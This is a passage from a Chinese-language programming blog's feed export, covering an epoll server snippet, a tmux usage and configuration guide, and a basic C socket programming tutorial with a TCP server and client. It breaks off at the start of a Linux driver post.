class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_bind_listen</span><span class="hljs-params">(<span class="hljs-type">char</span> *address,<span class="hljs-type">char</span> *port,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> backlog)</span><br>&#123;<br>    <span class="hljs-comment">//......</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd = create_bind_listen(argv[<span class="hljs-number">1</span>],argv[<span class="hljs-number">2</span>],<span class="hljs-number">10</span>);<br>    <span class="hljs-type">int</span> epfd = epoll_create(<span class="hljs-number">100</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">epoll_fd</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">event_epoll</span>[10];</span><br>    epoll_fd.fd = fd;<br>    epoll_fd.events = EPOLLIN;<br>    epoll_fd.data.fd = fd;<br>    epoll_ctl(epfd,EPOLL_CTL_ADD,&amp;epoll_fd);<br>    <span class="hljs-type">int</span> event_count = epoll_wait(epfd,event_epoll,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;event_count;i++)<br>    &#123;<br>        <span class="hljs-comment">//handler(event_poll[i].fd);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tmux基本使用</title>
    <link href="/2022/04/17/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/04/17/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="tmux配置教程"><a href="#tmux配置教程" class="headerlink" title="tmux配置教程"></a>tmux配置教程</h1><h3 id="1-tmux是什么"><a href="#1-tmux是什么" class="headerlink" title="1.tmux是什么?"></a>1.tmux是什么?</h3><p>tmux是一个终端复用工具,在实际开发运维中,可以用来保存当前工作状态,也可以将当前的单个终端拆分多个窗口。</p><h3 id="2-tmux的基本结构"><a href="#2-tmux的基本结构" class="headerlink" title="2.tmux的基本结构"></a>2.tmux的基本结构</h3><p>tmux为C&#x2F;S架构,tmux进程为守护进程,独立于终端之外,在不使用tmux的情况下,在当前终端执行的所有任务都为当前终端的子进程,而在使用了tmux之后,在tmux下执行的任务为tmux的子进程,而tmux为一个守护进程,因此不用担心在退出当前终端或者远程ssh突然断网时，执行的任务被杀死的情况.</p><h3 id="3-tmux的三个概念"><a href="#3-tmux的三个概念" class="headerlink" title="3.tmux的三个概念"></a>3.tmux的三个概念</h3><ul><li><p>1.session</p><p>一个session就是一个会话,session为tmux的一个会话,一个tmux可以同时开多个session</p></li><li><p>2.windows</p><p>window为session的子集,一个session可以有有多个window</p></li><li><p>3.pannel</p><p>一个pannel为一个窗格,为window的子集,一个window可以有多个pannel</p></li></ul><h3 id="4-tmux的安装使用"><a href="#4-tmux的安装使用" class="headerlink" title="4.tmux的安装使用"></a>4.tmux的安装使用</h3><h5 id="tmux的安装"><a href="#tmux的安装" class="headerlink" title="tmux的安装"></a>tmux的安装</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S tmux<br></code></pre></td></tr></table></figure><h5 id="tmux配置文件"><a href="#tmux配置文件" class="headerlink" title="tmux配置文件"></a>tmux配置文件</h5><p>tmux系统配置文件为&#x2F;etc&#x2F;tmux.conf,用户配置文件为~&#x2F;.tmux.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#解绑prefix键位</span><br>unbind C-b<br>unbind <span class="hljs-string">&#x27;&quot;&#x27;</span><br>unbind <span class="hljs-string">&#x27;%&#x27;</span><br><span class="hljs-comment">#设置prefix键位为C-a</span><br><span class="hljs-built_in">set</span> -g prefix C-a<br><span class="hljs-built_in">bind</span> C-a send-prefix<br><span class="hljs-comment">#设置切分窗格键位为prefix和h以及prefix和v</span><br><span class="hljs-built_in">bind</span> h split-window -h<br><span class="hljs-built_in">bind</span> v split-window -v<br><span class="hljs-comment">#设置C-r为重载tmux配置文件(指定-n为不用使用prefix键位就可以触发)</span><br>bind-key -n C-r source-file ~/.tmux.conf<br><span class="hljs-comment">#设置调整窗格大小键位(指定-r键位为不用每次触发的时候都要使用prefix键位(只要摁一次prefix键位就可以持续出发操作))</span><br><span class="hljs-built_in">bind</span> -r H resize-pane -L 5<br><span class="hljs-built_in">bind</span> -r J resize-pane -D 5<br><span class="hljs-built_in">bind</span> -r K resize-pane -U 5<br><span class="hljs-built_in">bind</span> -r L resize-pane -R 5<br><span class="hljs-comment">#bind k selectp -U</span><br><span class="hljs-comment">#bind h selectp -L</span><br><span class="hljs-comment">#bind j selectp -D</span><br><span class="hljs-comment">#bind l selectp -R</span><br><span class="hljs-comment">#bind -r ^k resizep -U 5</span><br><span class="hljs-comment">#bind -r ^h resizep -L 5</span><br><span class="hljs-comment">#bind -r ^j resizep -D 5</span><br><span class="hljs-comment">#bind -r ^l resizep -R 5</span><br></code></pre></td></tr></table></figure><h5 id="tmux常用命令"><a href="#tmux常用命令" class="headerlink" title="tmux常用命令"></a>tmux常用命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个tmux会话并在该tmux会话下创建一个窗口并在该窗口下创建一个pannel</span><br>tmux<br><span class="hljs-comment">#查看tmux会话</span><br>tmux list-session<br><span class="hljs-comment">#离开tmux会话</span><br>tmux detach<br><span class="hljs-comment">#进入已经打开的tmux会话</span><br>tmux attach<br><span class="hljs-comment">#Ctrl+b %：划分左右两个窗格。</span><br><span class="hljs-comment">#Ctrl+b &quot;：划分上下两个窗格。</span><br><span class="hljs-comment">#Ctrl+b &lt;arrow key&gt;：光标切换到其他窗格。&lt;arrow key&gt;是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。</span><br><span class="hljs-comment">#Ctrl+b ;：光标切换到上一个窗格。</span><br><span class="hljs-comment">#Ctrl+b o：光标切换到下一个窗格。</span><br><span class="hljs-comment">#Ctrl+b &#123;：当前窗格与上一个窗格交换位置。</span><br><span class="hljs-comment">#Ctrl+b &#125;：当前窗格与下一个窗格交换位置。</span><br><span class="hljs-comment">#Ctrl+b Ctrl+o：所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。</span><br><span class="hljs-comment">#Ctrl+b Alt+o：所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。</span><br><span class="hljs-comment">#Ctrl+b x：关闭当前窗格。</span><br><span class="hljs-comment">#Ctrl+b !：将当前窗格拆分为一个独立窗口。</span><br><span class="hljs-comment">#Ctrl+b z：当前窗格全屏显示，再使用一次会变回原来大小。</span><br><span class="hljs-comment">#Ctrl+b Ctrl+&lt;arrow key&gt;：按箭头方向调整窗格大小。</span><br><span class="hljs-comment">#Ctrl+b q：显示窗格编号。</span><br><br><span class="hljs-comment">#切换窗格</span><br><br><span class="hljs-comment"># 光标切换到上方窗格</span><br>tmux select-pane -U<br><br><span class="hljs-comment"># 光标切换到下方窗格</span><br>tmux select-pane -D<br><br><span class="hljs-comment"># 光标切换到左边窗格</span><br>tmux select-pane -L<br><br><span class="hljs-comment"># 光标切换到右边窗格</span><br>tmux select-pane -R<br><br><span class="hljs-comment">#交换窗格</span><br><br><span class="hljs-comment"># 当前窗格上移</span><br>tmux swap-pane -U<br><br><span class="hljs-comment"># 当前窗格下移</span><br>tmux swap-pane -D<br><span class="hljs-comment">#窗口管理</span><br><br><span class="hljs-comment">#创建一个新的窗口</span><br>tmux new-window <span class="hljs-string">&quot;window-name&quot;</span><br><span class="hljs-comment">#切换窗口</span><br>tmux select-window -t &lt;window-number&gt; or &lt;window-name&gt;<br><span class="hljs-comment">#重命名window(修改当前窗口的名称)</span><br>tmux rename-window <span class="hljs-string">&quot;new-name&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>socket编程</title>
    <link href="/2022/04/17/socket%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/04/17/socket%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="socket编程"><a href="#socket编程" class="headerlink" title="socket编程"></a>socket编程</h1><h4 id="1-什么是socket"><a href="#1-什么是socket" class="headerlink" title="1.什么是socket?"></a>1.什么是socket?</h4><p>socket是应用层与TCP&#x2F;IP协议簇通信的中间抽象层,就是对网络中不同主机的应用进程之间进行双向通信的端点的抽象,提供了应用层进程利用网络协议交换数据的机制。套接字上联应用层，下联协议栈，是应用程序利用网络协议进行通信的接口</p><h4 id="2-socket分类"><a href="#2-socket分类" class="headerlink" title="2.socket分类"></a>2.socket分类</h4><ul><li><p>SOCK_STREAM</p><p>基于TCP协议,面向连接,提供可靠传输,拥塞控制,数据校验,数据重传</p></li><li><p>SOCK_DGRAM</p><p>尽最大努力交付,可以一对多通信,多对多通信</p></li><li><p>SOCK_RAM</p><p>基于ip协议,可以基于ip协议自行组装数据包,利用原始套接字可以处理如ICMP,IGMP,等网络层的数据包。</p></li></ul><h4 id="3-常用的api"><a href="#3-常用的api" class="headerlink" title="3.常用的api"></a>3.常用的api</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> domain,<span class="hljs-type">int</span> type,<span class="hljs-type">int</span> protocol)</span>                    <span class="hljs-comment">//用于创建一个socket</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr,<span class="hljs-type">socklen_t</span> len)</span>      <span class="hljs-comment">//用于绑定一个端口</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">int</span> backlog)</span>;                                 <span class="hljs-comment">//用于监听即将到来的连接</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr,<span class="hljs-type">socklen_t</span> len)</span>   <span class="hljs-comment">//用于连接一个远程服务器</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> count)</span>                     <span class="hljs-comment">//用于读取socket缓冲区内容</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> count)</span>                    <span class="hljs-comment">//用于将数据拷贝到发送缓冲区</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">send</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags)</span>       <span class="hljs-comment">//类似于write函数</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">recv</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags)</span>         <span class="hljs-comment">//类似于read函数</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sendto</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *dest_addr,<span class="hljs-type">socklen_t</span> addrlen)</span>;                         <span class="hljs-comment">//用于udp socket编程发送数据</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">recvfrom</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *src_addr,<span class="hljs-type">socklen_t</span> *addrlen)</span>;                                    <span class="hljs-comment">//用于udp socket编程接收数据</span><br></code></pre></td></tr></table></figure><h4 id="4-基本的编程步骤"><a href="#4-基本的编程步骤" class="headerlink" title="4.基本的编程步骤"></a>4.基本的编程步骤</h4><p>服务端</p><pre><code class=" mermaid">graph TD;a(socket 创建socket文件)--&gt;b(bind 绑定端口和ip地址)--&gt;c(listen 开始监听ip和端口)--&gt;d(accept 接收来自客户端的连接)--&gt;e(read/write开始和客户端收发数据)</code></pre><p>客户端</p><pre><code class=" mermaid">graph TD;a(socket 创建socket文件)--&gt;b(connect 连接服务器)--&gt;c(read/write,开始和服务端收发数据)</code></pre><h4 id="5-实例"><a href="#5-实例" class="headerlink" title="5.实例"></a>5.实例</h4><h5 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKLEN (sizeof(struct sockaddr))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Usage</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s SERVERADDR SERVERPORT&quot;</span>, argv);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">New_Socket</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">char</span>* port, <span class="hljs-type">int</span> backlog)</span><br>&#123;<br><span class="hljs-comment">//创建socket</span><br><span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">ADDR</span>;</span><br>ADDR.sin_family = AF_INET;<br>ADDR.sin_port = htons(atoi(port));<br><span class="hljs-keyword">if</span> (inet_pton(AF_INET, addr, &amp;ADDR.sin_addr) != <span class="hljs-number">1</span>) &#123;<br>perror(<span class="hljs-string">&quot;inet_pton&quot;</span>);<br>&#125;<br><span class="hljs-comment">//绑定地址以及端口</span><br><span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;ADDR, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;bind&quot;</span>);<br>&#125;<br><span class="hljs-comment">//进入监听状态,等待接收来之客户端的连接</span><br><span class="hljs-keyword">if</span> (listen(fd, backlog) != <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;listen&quot;</span>);<br>&#125;<br><span class="hljs-comment">//返回socket</span><br><span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-type">socklen_t</span> len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in);<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>Usage(argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">int</span> fd = New_Socket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], <span class="hljs-number">5</span>);<br><span class="hljs-comment">//定义客户端信息变量</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client_addr</span>;</span><br><span class="hljs-comment">//接收来自客户端发来的请求</span><br><span class="hljs-type">int</span> clientfd = accept(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;client_addr, &amp;len);<br><span class="hljs-keyword">if</span> (clientfd == <span class="hljs-number">-1</span>) &#123;<br>perror(<span class="hljs-string">&quot;accept&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>bzero(buffer, <span class="hljs-number">100</span>);<br><span class="hljs-comment">//接收来自客户端发来的数据</span><br><span class="hljs-keyword">if</span> (read(clientfd, buffer, <span class="hljs-number">100</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv from client:%s&quot;</span>, buffer);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>perror(<span class="hljs-string">&quot;read&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//客户端</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKLEN (sizeof(struct sockaddr))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Usage</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv)</span> <span class="hljs-comment">//使用帮助函数</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s SERVERADDR SERVERPORT&quot;</span>, argv);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">New_Socket</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">char</span>* port)</span> <span class="hljs-comment">//创建socket用于连接远程服务器</span><br>&#123;<br><span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>perror(<span class="hljs-string">&quot;socket&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">serveraddr</span>;</span><br>serveraddr.sin_family = AF_INET;<br>serveraddr.sin_port = htons(atoi(port));<br><span class="hljs-comment">//转换ip地址类型</span><br><span class="hljs-keyword">if</span> (inet_pton(AF_INET, addr, &amp;serveraddr.sin_addr) != <span class="hljs-number">1</span>) &#123;<br>perror(<span class="hljs-string">&quot;inet_pton&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//连接服务器</span><br><span class="hljs-keyword">if</span> (connect(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;serveraddr, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;connect&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>Usage(argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//创建socket</span><br><span class="hljs-type">int</span> fd = New_Socket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connect server error!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//定义发送数据</span><br><span class="hljs-type">char</span>* str = <span class="hljs-string">&quot;Hello,World&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//将数据写入socket发送缓冲区</span><br><span class="hljs-keyword">if</span> (write(fd, str, len) != len) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send string to server error!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send string to server successful!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux设备驱动开发入门</title>
    <link href="/2022/04/17/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <url>/2022/04/17/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linux设备驱动开发入门"><a href="#linux设备驱动开发入门" class="headerlink" title="linux设备驱动开发入门"></a>linux设备驱动开发入门</h1><h3 id="1-linux内核模块开发入门"><a href="#1-linux内核模块开发入门" class="headerlink" title="1.linux内核模块开发入门"></a>1.linux内核模块开发入门</h3><p>基本步骤</p><pre><code class=" mermaid">graph LR;a(编写内核模块代码)--&gt;b(修改该目录下的Kconfig文件和Makefile)--&gt;c(运行内核模块)</code></pre><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 